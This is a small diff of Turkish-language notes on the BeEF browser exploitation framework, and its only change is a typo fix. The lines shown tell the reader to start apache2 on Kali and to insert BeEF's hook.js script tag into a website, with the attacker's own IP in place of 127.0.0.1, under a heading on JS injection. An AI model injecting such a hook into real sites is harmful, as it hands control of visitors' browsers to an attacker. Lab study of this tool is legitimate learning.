@@ -19,7 +19,7 @@ Nasıl çalışır?
 - Web sitesi oluşturulmalı ve js kodu koyulmalı
 - Denemek içim kali web olarak açılabilir
   > services apache2 start
-- Beef açıldığında terminalde verilen <script src="http://127.0.0.1:3000/hook.js"></script> kodunu kendi kali ip vyazılarak siteye eklenir
+- Beef açıldığında terminalde verilen <script src="http://127.0.0.1:3000/hook.js"></script> kodunu kendi kali ip yazılarak siteye eklenir
 
 **_ JS Enjeksiyonu _**
 
